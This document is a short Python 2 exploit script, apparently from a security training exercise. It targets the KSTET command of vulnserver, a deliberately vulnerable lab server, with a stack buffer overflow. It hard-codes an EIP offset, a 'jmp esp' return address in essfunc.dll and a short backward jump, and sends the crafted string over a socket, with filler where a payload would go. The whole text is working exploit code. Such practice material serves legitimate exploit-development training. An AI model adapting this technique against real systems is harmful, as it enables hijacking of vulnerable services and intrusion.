# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# EIP offset: 66
#   0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\PT LabMachine\Desktop\vulnserver\essfunc.dll)
# EBB8              jmp short 0xffffffba


import socket

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.12',9999))
print cnct.recv(1024)

evilString = "A" * 66 + "\xdf\x11\x50\x62" + "\xEB\xB8" +"C" * 18
cnct.send("KSTET /.:/"+evilString)
cnct.close()